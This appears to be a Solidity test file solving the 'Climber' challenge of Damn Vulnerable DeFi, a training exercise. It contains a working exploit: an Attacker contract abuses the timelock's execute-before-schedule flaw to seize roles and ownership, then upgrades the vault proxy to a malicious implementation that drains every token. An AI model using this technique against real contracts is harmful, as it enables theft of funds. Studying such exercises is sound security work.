// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(vault, timelock, token, recovery);
        attacker.attack();
    } 

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}


// hmm this is just a demo malicious contract for implementation
contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function drainFunds(address token, address receiver) external {
        SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}

contract Attacker {
        
        ClimberVault vault;
        ClimberTimelock timelock;
        DamnValuableToken token;
        address recovery;
        address[] targets = new address[](4);
        uint256[] values = new uint256[](4);
        bytes[] dataElements = new bytes[](4);

        constructor(
            ClimberVault _vault,
            ClimberTimelock _timelock,
            DamnValuableToken _token,
            address _recovery
        ) {
            vault = _vault;
            timelock = _timelock;
            token = _token;
            recovery = _recovery;
        }

        function attack() external {
            
            address maliciousImpl = address(new MaliciousVault());

            bytes memory grantRoleData = abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            );

            bytes memory changeDelayData = abi.encodeWithSignature(
                "updateDelay(uint64)",
                uint64(0)
            );

            bytes memory transferOwnershipData = abi.encodeWithSignature(
                "transferOwnership(address)",
                address(this)
            );

            bytes memory scheduleData = abi.encodeWithSignature(
                "timelockSchedule()"
            );
        
            targets[0] = address(timelock);
            values[0] = 0;
            dataElements[0] = grantRoleData;

            targets[1] = address(timelock);
            values[1] = 0;
            dataElements[1] = changeDelayData;

            targets[2] = address(vault);
            values[2] = 0;
            dataElements[2] = transferOwnershipData;

            targets[3] = address(this);
            values[3] = 0;
            dataElements[3] = scheduleData;

            timelock.execute(
                targets,
                values,
                dataElements,
                bytes32(0)
            );

            vault.upgradeToAndCall(address(maliciousImpl), "");
            MaliciousVault(address(vault)).drainFunds(address(token), recovery);
        }

        function timelockSchedule() external {
            timelock.schedule(targets, values, dataElements, bytes32(0));
        }
    }

